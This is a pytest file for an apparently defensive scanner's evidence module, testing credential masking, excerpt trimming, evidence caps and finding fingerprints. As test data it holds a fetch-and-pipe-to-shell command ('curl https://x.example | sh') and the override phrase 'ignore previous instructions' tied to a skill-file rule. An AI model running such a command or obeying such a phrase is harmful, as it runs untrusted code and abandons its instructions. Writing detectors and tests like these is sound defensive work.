"""Spec 5.10 and claim P7: masking and excerpts."""
from __future__ import annotations

from conftest import credential

from spellwarden_scan.evidence import EVIDENCE_MAX, bounded_evidence, code_point_names, excerpt, fingerprint, mask_credentials


def test_every_credential_pattern_is_masked_and_masking_is_idempotent():
    for kind in ("aws", "github", "slack", "anthropic", "openai", "google", "jwt", "gitlab", "github_pat"):
        value = credential(kind)
        masked = mask_credentials(f"token is {value} end")
        assert value not in masked and "***" in masked and masked.endswith(" end")
        assert mask_credentials(masked) == masked
    masked = mask_credentials("use " + credential("pem"))
    assert "PRIVATE KEY" not in masked


def test_mixed_runs_and_bearer_schemes_are_masked_but_prose_is_not():
    token = "abc123" + "DEF456ghi789JKL"  # built at runtime: no credential-shaped literal in the repository (r0:F8)
    assert mask_credentials(f"x={token}") == "x=ab***"  # `=` belongs to the run (spec 5.10): the pair is one token
    assert mask_credentials(f"see {token}") == "see abc1***"
    assert mask_credentials("token=abcd1234abcd1234") == "toke***"  # a 16-character secret behind `=` is still masked
    assert mask_credentials("Authorization: Bearer abcdefghijklmnop") == "Authorization: Bearer ***"
    assert mask_credentials("Authorization: Basic dXNlcjpwYXNz") == "Authorization: Basic ***"
    assert mask_credentials("Authorization: Bearer abc") == "Authorization: Bearer ***"  # short tokens too
    prose = "Read the configuration file and report what changed since yesterday."
    assert mask_credentials(prose) == prose
    assert mask_credentials("aaaaaaaaaaaaaaaaaaaaaaaaa") == "aaaaaaaaaaaaaaaaaaaaaaaaa"  # letters only: not a token


def test_excerpt_is_trimmed_collapsed_masked_and_cut():
    assert excerpt("   curl   https://x.example  |  sh  ") == "curl https://x.example | sh"
    long = "x " * 400
    cut = excerpt(long)
    assert len(cut) == EVIDENCE_MAX == 300 and cut.endswith("...")
    assert credential("aws") not in excerpt("key " + credential("aws"))


def test_bounded_evidence_caps_custom_text_at_300_and_masks_it():
    assert len(bounded_evidence("U+200B ZERO WIDTH SPACE, " * 100)) == 300
    assert bounded_evidence("a" * 1000).endswith("...") and len(bounded_evidence("a" * 1000)) == 300
    assert bounded_evidence("a" * 300) == "a" * 300
    assert bounded_evidence("  tool   x  ") == "tool x"
    assert credential("github") not in bounded_evidence("quote " + credential("github"))


def test_fingerprint_and_code_point_names():
    assert fingerprint("SW-SKL-001", "SKILL.md", "ignore previous instructions") == fingerprint("SW-SKL-001", "SKILL.md", "ignore previous instructions")
    assert fingerprint("SW-SKL-001", "SKILL.md", "a") != fingerprint("SW-SKL-001", "other.md", "a")
    assert code_point_names("a\u200bb\u202ec") == "U+200B ZERO WIDTH SPACE, U+202E RIGHT-TO-LEFT OVERRIDE"


def test_any_value_after_a_secret_like_name_is_masked_whatever_its_shape():
    """Security review: an unquoted, short or letters-only value after `password=`, `token:` or `api_key=` left
    the 20-character and quoted rules untouched; it is masked whole, placeholders excepted."""
    short = "hun" + "ter2"
    assert mask_credentials(f"password={short}") == "password=***"
    assert mask_credentials(f"export API_KEY={short}x") == "export API_KEY=***"
    assert mask_credentials(f"db_password: {short} # prod") == "db_password: *** # prod"
    assert mask_credentials(f'"client_secret": "{short}"') == '"client_secret": "***"'
    for kept in ("token=$TOKEN", "api_key=<your-key>", "password: ${DB_PASSWORD}", 'secret: "xxxx"', "password: <your password>"):
        assert mask_credentials(kept) == kept
    for leaked in ("x" + "yz$1abc", "my" + "example1", "s3cr" + "et<b>"):  # a placeholder word inside a real value
        assert mask_credentials(f"password={leaked}") == "password=***", leaked
    assert mask_credentials('password = "hunter two"') == 'password = "***"'  # masked to the closing quote
    assert mask_credentials("password=" + "abc,def;ghi&jk" + " next") == "password=*** next"  # to the next space
    # A default or a command may carry the secret itself: masked whole (security review of 478b8aa).
    for written in ("password=${DB_PASS:-" + short + "}", "token=$(echo " + short + ")", "api_key=<" + short + "1>"):
        assert short not in mask_credentials(written), written
    secret = "hun" + "ter two"
    for written, masked in ((f'password = "{secret}', 'password = "***'), (f'password = """{secret}""" end', 'password = """***""" end'),
                            (f"secret: '{secret}", "secret: '***"), (f'password = """{secret}', 'password = """***'), ('token = "ab\\"cd ef" end', 'token = "***" end')):
        assert mask_credentials(written) == masked, written  # unterminated, triple-quoted, escaped quote
        assert mask_credentials(masked) == masked
    once = mask_credentials(f"password={short} and token={short}")
    assert once == "password=*** and token=***" and mask_credentials(once) == once
